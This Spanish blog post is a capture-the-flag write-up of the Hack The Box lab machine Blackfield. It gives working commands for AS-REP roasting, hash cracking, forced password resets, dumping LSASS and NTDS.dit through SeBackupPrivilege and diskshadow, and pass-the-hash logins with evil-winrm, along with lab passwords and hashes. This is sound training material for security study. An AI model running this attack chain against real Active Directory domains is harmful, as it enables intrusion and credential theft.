---
layout: post
title: HTB_Blackfield
date: 2023/07/10
slug: HTB_Blackfield
heroImage: /assets/machines.jpg
---

# Blackfield {-}

## Introduccion {-}

La maquina del dia se llama Blackfield.

El replay del live se puede ver aqui

[![S4vitaar Blackfield maquina](https://img.youtube.com/vi/cIDYqSOlECs/0.jpg)](https://www.youtube.com/watch?v=cIDYqSOlECs)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.192
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.192
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.192 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p53,88,135,139,389,445,593,3268,49676 10.10.10.192 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?                       | Que falta?                |
| ------ | ---------- | ---------------------------------------- | ------------------------- |
| 53     | domain     | Domain controller rpcclient null session |                           |
| 88     | Kerberos   | asproasting attack                       | lista de usuarios validos |
| 135    | msrpc      |                                          |                           |
| 139    | netbios    |                                          |                           |
| 389    | LDAP       | Bloodhound                               | credenciales              |
| 445    | smb        | Null session                             |                           |
| 593    | ncacn_http |                                          |                           |
| 3268   | ldap       |                                          |                           |
| 5985   | WinRM      | evil-winrm                               | credenciales              |
| 49676  | ncacn_http | Puertos por defecto de windows           |                           |


### Buscando ususarios con rpcclient y rpcenum {-}

```bash
rpcclient -U "" 10.10.10.192 -N

rpcclient $> enumdomusers
```

Como no nos deja unumerar cosas con el null session vamos a necesitar credenciales validas para poder hacerlo

### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.192
smbclient -L 10.10.10.192 -N
```

Vemos que estamos en frente de una maquina Windows 10 Standard de 64 bit pro que se llama **DC01** en el dominio **BLACKFIELD.local**.
Añadimos los dominios 
```bash
 blackfield.local 
```
 y 
```bash
 dc01.blackfield.local 
```
 a nuestro 
```bash
 /etc/hosts 
```
.

Tambien vemos recursos compartidos a nivel de red como:

- ADMIN$
- C$
- forensic
- IPC$
- NETLOGON
- profiles$
- SYSVOL

Usando de la heramienta smbmap, podemos ver si tenemos accessos a estos recursos.

```bash
smbmap -H 10.10.10.192 -u 'null'
```

y vemos que denemos accesso con derecho de lectura a los recursos 
```bash
 profiles$ 
```
 y 
```bash
 IPC$ 
```
. IPC$ no es un recurso que nos interesa.

```bash
smbclient //10.10.10.192/profiles$ -N
dir
```

Aqui podemos ver registros que parecen ser directorios de ususarios.
## Vulnerability Assessment {-}

### Asproasting Attack {-}

Una vez que tenemos un listado de usuarios, podemos hacer un **asproating attack**

1. copiamos todos los usuarios en un fichero llamado users

    ```bash
    nano users_dir
    Ctrl+shift+v

    cat users_dir | awk '{print $1}' > users
    rm users_dir
    ```

1. Con 
```bash
 GetNPUsers.py 
```
 vamos a ver si podemos recuperar un TGT

    ```bash
    GetNPUsers blackfield.local/ -no-pass -usersfile users | grep -v "not found"
    ```

Aqui vemos el TGT del usuario **support**. Esto quiere decir que este usuario tenia el *Don't required pre-auth* seteado. Copiamos todo el hash 
del usuario svc-alfresco en un fichero llamado hash y lo crackeamos con John


### Crackeando el hash con John {-}

```bash
john -wordlists=/usr/share/wordlists/rockyou.txt hash
```

Aqui encontramos su contraseña. Ya podemos effectuar un Kerberoasting attack. Pero primero, como siempre, credenciales encontradas son 
credenciales que checkeamos con crackmapexec

```bash
crackmapexec smb 10.10.10.192 -u 'support' -p '#00^BlackKnight'
```

Aprovechamos para ver si nos podemos conectar via winrm.

```bash
crackmapexec winrm 10.10.10.192 -u 'support' -p '#00^BlackKnight'
```

Aqui vemos que el usuario es valido y que tiene permiso de lectura sobre el directorio **SYSVOL** y que lo normal seria de buscar si existe un
fichero 
```bash
 groups.xml 
```
, porque a dentro tienes un 
```bash
 cpassword=HASH 
```
 que contiene un hash que se podria crackear con la heramienta **gpp-decrypt** pero 
Tito no adelanta que no es el caso no se aplicaba.

### Kereroasting attack {-}

Los ataques Kereroasting se pueden manejar con la utilidad 
```bash
 GetUserSPNs.py 
```


```bash
GetUserSPNs.py blackfield.local/support:#00^BlackKnight@10.10.10.192 -request -dc-ip 10.10.10.192
```

Esta utilidad nos retorna un mensaje como que no son las buenas credenciales.

### Enumeracion de usuarios con rpcclient {-}

Ahora que tenemos credenciales validas, intentamos connectarnos al 
```bash
 rpcclient 
```


```bash
rpcclient -U "support%#00^BlackKnight" 10.10.10.192

> rpcclient $> enumdomusers
```

Ahora podemos ver la lista de los usuarios registrados a nivel de systema. Buscamos usuarios del grupo Admins via la busqueda de los diferentes grupos.

```bash
> rpcclient $> enumdomgroups
```

copiamos el rid del grupo 
```bash
 Domain Admins 
```
 

```bash
> rpcclient $> querygroupmem 0x200
```

Aqui podemos ver el **rid** del usuario que hace parte del grupo admin.

```bash
> rpcclient $> queryuser 0x1f4
```

Vemos quel usuario es **Administrator**, pero lo hacemos para saber si hay otros usuarios administradores pero aqui no es el caso.

### Enumeracion del systema con bloodhound-python para ganar acceso a la maquina {-}

Con la utilidad 
```bash
 bloodhound-python 
```
, podemos enumerar cosas si tener que estar connectado a la maquina victima.

1. instalamos bloodhound

    ```bash
    pip3 install bloodhound
    ```

1. lanzamos bloodhound-python

    ```bash
    bloodhound-python
    bloodhound-python -c ALL -u support -p '#00^BlackKnight' -ns 10.10.10.192 -dc dc01.blackfield.local -d blackfield.local 
    ```

    esto nos crea un reporte en formato json.

1. instalamos bloodhound y neo4j

    ```bash
    sudo apt install neo4j bloodhound
    ```

1. lanzamos neo4j service

    ```bash
    sudo neo4j console
    ```

1. lanzamos bloodhound

    ```bash
    bloodhound --no-sandbox &> /dev/null &
    disown
    ```

1. connectamos bloodhound al neo4j database

1. Drag & Drop de los ficheros **.json** hacia la ventana del bloodhound y en el Analysis tab

    - Find Shortest Paths to Domain Admins
    - Find Paths from Kerberoastable Users
    - Find AS-REP Roastable Users
    

Aqui no vemos gran cosa, lo unico el usuario support que es asreproasteable pero poco mas. Analizamos los nodos de este usuario.
Le damos un clic derecho al usuario y lo seteamos a Mark User as Owned.
Vamos a Node Info y miramos donde hay un 1.

Vemos que el usuario **support** puede forzar un cambio de contraseña al usuario **AUDIT2020**  


### Forzar un cambio de contraseña con rpcclient {-}

```bash
rpcclient -U "support%#00^BlackKnight" 10.10.10.192

> rpcclient $> setuserinfo2 audit2020 24 s4vitar123$!
```

Ahora que hemos cambiado la contraseña, lo miramos con **crackmapexec**

```bash
crackmapexec smb 10.10.10.192 -u 'audit2020' -p 's4vitar123$!'
```

El cambio de contraseña a sido effectiva y ahora miramos que privilegios tiene en los recursos compartidos tiene a nivel de red.

```bash
smbmap -H 10.10.10.192 -u 'audit2020' -p 's4vitar123$!'
```

Vemos que este usuario tiene privilegios de lectura sobre el directorio 
```bash
 forensic 
```
. Miramos lo que hay en este directorio.




## Vuln exploit & Gaining Access {-}

### Ganando accesso con Win-RM {-}

```bash
smbclient //10.10.10.192/forensic -U 'audit2020%s4vitar123$!'
dir
cd commands_output
get domain_users.txt
get domain_admins.txt
cd ..
cd memory_analysis
dir
get lsass.zip
```

Nos hemos descargados un fichero domain_users y un fichero domain_admins. Podemos ver un usuario **iPownedYourCompany** que nos hace
pensar que esta maquina a sido comprometida anteriormente. Tambien vemos un directorio memory_analysis y un fichero nos llama la atencion.
Este fichero es el 
```bash
 lsass.zip 
```
. Nos llama la atencion porque hay una utilidad 
```bash
 pypykatz 
```
 con la cual podriamos ver informaciones relevantes dumpeadas
a nivel de memoria. 

```bash
unzip lsass.zip
pypykatz lsa minidump lsass.DMP
```

Aqui tenemos informaciones como usuarios y contraseña **NT** hasheadas. Los NT Hashes nos permiten hacer **PassTheHash** que simplemente seria connectarnos
con el usuario poniendo la contraseña hasheada (No se necesita conocer la contraseña en este caso).

Vemos el hash del usuario Administrator. Controlamos esto con crackmap exec.

```bash
crackmapexec smb 10.10.10.192 -u 'Administrator' -H '7f1e4ff8c5a8e6b5fcae2d9c0472cd62'
```

Pero vemos que esta credencial no es valida. Vemos otro usuario 
```bash
 svc_backup 
```
 lo miramos.

```bash
crackmapexec smb 10.10.10.192 -u 'svc_backup' -H '9659d1d1dcd9250115e2206d9f49400d'
```

Esta credencial esta valida. Intentamos ver si nos podemos conectar con winrm

```bash
crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H '9659d1d1dcd9250115e2206d9f49400d'
```

Aqui vemos que este usuario es Pwn3d!

```bash
evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9659d1d1dcd9250115e2206d9f49400d'

whoami 
#Output
blackfield\svc_backup

ipconfig
#Output
10.10.10.192
```

Estamos conectados como el usuario svc_backup y podemos leer la flag.## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd C:\Users\Administrator
dir
cd Desktop
dir
type root.txt
whoami /priv
```

No podemos todavia leer el **root.txt**, pero tiene un privilegio muy interesante que es el privilegio **SeBackupPrivilege**.
Teniendo este privilegio, podriamos hacer una copia (backup) de seguridad de elemento del systema como el **NTDS** que nos permitirian
recuperar los hashes de los usuarios del systema, entre ellos el usuario Administrator.

```bash
cd C:\
mkdir Temp
cd Temp
reg save HKLM\system system
```

Aqui hacemos una copia del systema que es necesario para posteriormente dumpear los hashes NTLM del fichero 
```bash
 ntds.dit 
```
. Intentamos copiar 
el fichero 
```bash
 ntds.dit 
```


```bash
copy C:\Windows\NTDS\ntds.dit ntds.dit
#Output
PermissionDenied!
```

Teniendo este privilegio y siguiendo la guia de la web [pentestlab](https://pentestlab.blog/tag/diskshadow/) podemos tirando de robocopy en vez de
copy, copiarnos este fichero. Creamos un fichero llamado example.txt y le ponemos los comandos siguientes.

```bash
set context persistent nowriters 
add volume c: alias savialias 
create 
expose %savialias% z:
```

> [ ! ] NOTAS: Hay que tener cuidado con estos ficheros que enviamos en maquinas windows de siempre poner un espacio al final de cada linia para evitar problemas

```bash
dos2unix example.txt
```

y desde la maquina victima, subimos el fichero

```bash
upload example.txt
diskshadow.exe /s example.txt
```

Ya podemos ver que en Z:\ hay el mismo contenido que en C:\ y si tratamos de copiar el fichero ntds.dit con el comando 
```bash
 copy z:\Windows\NTDS\ntds.dit ntds.dit 
```
 
nos arastra el mismo error. Pero usando del comando robocopy esto funcciona sin problemas.

```bash
robocopy z:\Windows\NTDS . ntds.dit
download ntds.dit
download system
```

> [ ! ] NOTAS: Si el download no funcciona, siempre podemos tratar de montar un directorio compartido a nivel de red con 
```bash
 impacket-smbfolder 
```


Ya podemos dumpear el ntds con 
```bash
 impacket-secretsdump 
```


```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

Ya podemos ver todos los hashes de los usuarios activos del systema.

```bash
crackmapexec winrm 10.10.10.192 -u 'Administrator' -H 194fb5e5179499be6424d4cd53b99e
```

Pwn3d!!!!


```bash
evil-winrm -i 10.10.10.192 -u 'Administrator' -H 194fb5e5179499be6424d4cd53b99e
whoami 
#Output
blackfield\administrator
```

Aqui hemos rooteado la maquina y podemos leer la flag.
